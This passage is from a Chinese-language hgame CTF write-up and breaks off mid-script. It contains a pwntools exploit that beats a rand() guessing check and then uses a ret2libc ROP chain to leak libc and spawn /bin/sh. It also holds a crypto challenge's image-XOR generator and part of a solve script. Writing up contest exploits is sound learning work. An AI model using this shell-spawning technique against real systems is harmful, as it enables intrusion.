class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Menlina: Well tarnished, tell me thy name.\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x12341234</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>srand <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置种子</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please guess the number:\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">100</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>myread <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'myread'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000401423</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040101a</span>\t</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>myread<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Here's a reward to thy brilliant mind.\"</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>put_addr <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>put_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'put====>'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>put_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>put_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>libc_base <span class=\"token operator\">=</span> put_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc====>'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>system <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote R4nd0m\\_Th1ngs\\_4r3\\_pr3sen7s\\_1n\\_l1f3\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezfmt-string100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezfmt-string100pt\">#</a> ezfmt string(100pt)</h3>\n<blockquote>\n<p>easy Format String</p>\n</blockquote>\n<p>没做出来，学习 exp</p>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> CRYPTO</h2>\n<h3 id=\"奇怪的图片100pt\"><a class=\"markdownIt-Anchor\" href=\"#奇怪的图片100pt\">#</a> 奇怪的图片 (100pt)</h3>\n<blockquote>\n<p>一些奇怪的图片</p>\n</blockquote>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image<span class=\"token punctuation\">,</span> ImageDraw<span class=\"token punctuation\">,</span> ImageFont</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> secrets</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"hgame&#123;fake_flag&#125;\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_random_image</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"white\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    pixels <span class=\"token operator\">=</span> image<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            red <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            green <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            blue <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            pixels<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>red<span class=\"token punctuation\">,</span> green<span class=\"token punctuation\">,</span> blue<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> image</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">draw_text</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    font_size <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    font <span class=\"token operator\">=</span> ImageFont<span class=\"token punctuation\">.</span>truetype<span class=\"token punctuation\">(</span><span class=\"token string\">\"arial.ttf\"</span><span class=\"token punctuation\">,</span> font_size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    text_color <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    x <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> width <span class=\"token operator\">-</span> font_size <span class=\"token operator\">*</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    y <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> height <span class=\"token operator\">-</span> font_size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    draw <span class=\"token operator\">=</span> ImageDraw<span class=\"token punctuation\">.</span>Draw<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    draw<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">,</span> font<span class=\"token operator\">=</span>font<span class=\"token punctuation\">,</span> fill<span class=\"token operator\">=</span>text_color<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">return</span> image</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">xor_images</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">,</span> image2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">if</span> image1<span class=\"token punctuation\">.</span>size <span class=\"token operator\">!=</span> image2<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"Images must have the same dimensions.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    xor_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span> image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    pixels1 <span class=\"token operator\">=</span> image1<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    pixels2 <span class=\"token operator\">=</span> image2<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    xor_pixels <span class=\"token operator\">=</span> xor_image<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            r1<span class=\"token punctuation\">,</span> g1<span class=\"token punctuation\">,</span> b1 <span class=\"token operator\">=</span> pixels1<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            r2<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">,</span> b2 <span class=\"token operator\">=</span> pixels2<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            xor_pixels<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>r1 <span class=\"token operator\">^</span> r2<span class=\"token punctuation\">,</span> g1 <span class=\"token operator\">^</span> g2<span class=\"token punctuation\">,</span> b1 <span class=\"token operator\">^</span> b2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">return</span> xor_image</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_unique_strings</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    unique_strings <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>unique_strings<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        random_string <span class=\"token operator\">=</span> secrets<span class=\"token punctuation\">.</span>token_hex<span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>random_string<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        unique_strings<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>random_string<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>unique_strings<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>random_strings <span class=\"token operator\">=</span> generate_unique_strings<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>random_strings<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>current_image <span class=\"token operator\">=</span> generate_random_image<span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>current_image<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>key_image <span class=\"token operator\">=</span> generate_random_image<span class=\"token punctuation\">(</span><span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>key_image<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">random_time</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\".\\\\png_out\\\\&#123;&#125;.png\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    current_image <span class=\"token operator\">=</span> draw_text<span class=\"token punctuation\">(</span>current_image<span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>random_time<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>xor_images<span class=\"token punctuation\">(</span>current_image<span class=\"token punctuation\">,</span> key_image<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> random_strings<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>大致思路应该让我们找到 key_image，去异或 draw_text () 覆盖上 current_image 的字母，但是我转念一想，如果找到如果找到了 key_image，但是图片的顺序是用 random_strings () 名称来打乱了，那么不确定顺序 flag 一样无法解决，所以我们找到第一张和第二张与 key_image 的图片即可，然后判断字母数量即可确定顺序。</p>\n<p>解题脚本不太优雅，还是等下 exp 学习一下捏</p>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image<span class=\"token punctuation\">,</span> ImageDraw<span class=\"token punctuation\">,</span> ImageFont</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> secrets</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>png1 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'4.png'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>png2 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'14.png'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#与 key_image 的 xor 顺序</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 4 7 20 15 21 9 12 19 13 16 2 10 18 5 17 8 3 6 1 11 14</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">xor_images</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">,</span> image2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> image1<span class=\"token punctuation\">.</span>size <span class=\"token operator\">!=</span> image2<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"Images must have the same dimensions.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    xor_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span> image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    pixels1 <span class=\"token operator\">=</span> image1<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    pixels2 <span class=\"token operator\">=</span> image2<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    xor_pixels <span class=\"token operator\">=</span> xor_image<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>image1<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td 